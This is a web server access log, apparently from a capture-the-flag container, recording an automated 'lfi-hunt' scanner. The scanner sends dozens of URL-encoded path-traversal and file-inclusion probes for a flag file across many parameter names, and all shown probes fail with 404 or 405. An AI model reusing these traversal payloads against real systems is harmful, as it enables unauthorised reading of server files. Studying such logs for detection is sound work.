phpmyadmin-1  | 2025-10-14T20:40:32.392942031Z 10.11.202.14 - - [14/Oct/2025:20:40:32 +0000] "\n" 400 484 "-" "-"
server-1      | 2025-10-18T09:09:32.241591473Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.243753089Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?doc=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.246132204Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?doc=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.248335593Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?doc=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.250700785Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?doc=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.252682148Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?page=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.254815768Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?page=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.256849351Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.259250483Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.261554014Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?template=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.263746454Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?template=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.266186040Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.268517013Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.271614635Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?tpl=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.273612913Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?tpl=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.275702665Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?tpl=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.277982095Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?tpl=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.280127745Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?url=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.282365830Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?url=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.284638173Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.286851875Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.289668545Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?u=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.291823107Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?u=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.293870771Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?u=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.295996099Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?u=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.298112710Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?target=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.300218708Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?target=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.302320612Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.304713721Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.307077461Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?resource=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.309592046Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?resource=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.311717838Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?resource=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.313915468Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /file?resource=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.316122570Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.318152234Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.320192312Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.322388147Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.324563110Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.326747381Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.329085371Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.331222142Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.333188001Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.335658076Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.337650170Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.339772091Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.341826438Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.343973064Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.345934291Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.348524248Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.350556459Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.352741048Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.354709824Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.356785363Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.358854904Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.361024160Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.363234400Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.365412927Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.368136639Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.370362234Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.372658695Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.374922190Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.376879923Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.379103983Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.381132771Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.383155577Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.385577687Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.387975332Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.389986326Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.392056463Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.394141119Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.396298423Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.398286669Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.400496414Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.402480731Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.405088648Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.407079898Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.409079544Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "POST /file HTTP/1.1" 405 153 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.411315359Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?file=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.413438361Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?file=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.415635824Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.417755793Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.419914909Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?path=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.422048307Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?path=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.426376182Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?path=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.428567240Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?path=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.430767382Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?name=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.432868987Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?name=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.435183557Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.437463007Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.440390720Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?doc=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.442572767Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?doc=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.444806401Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?doc=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.447094390Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?doc=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.449717567Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?page=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.452175787Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?page=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.454528235Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.457063443Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.459226000Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?template=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.461867645Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?template=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.463710963Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.465899417Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.467906576Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?tpl=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.470354805Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?tpl=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.472567366Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?tpl=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.474826471Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?tpl=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.476949974Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?url=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.479037378Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?url=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.481254033Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.483468422Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.487928732Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?u=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.491947408Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?u=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.494571535Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?u=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.496853753Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?u=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.499737909Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?target=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.503659514Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?target=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.505088143Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.507389613Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.509851683Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?resource=%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.512077980Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?resource=%2Fproc%2Fself%2Fcwd%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
server-1      | 2025-10-18T09:09:32.514428150Z 10.11.202.14 - - [18/Oct/2025:09:09:32 +0000] "GET /open?resource=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fapp%2Fflag HTTP/1.1" 404 207 "-" "lfi-hunt/1.0"
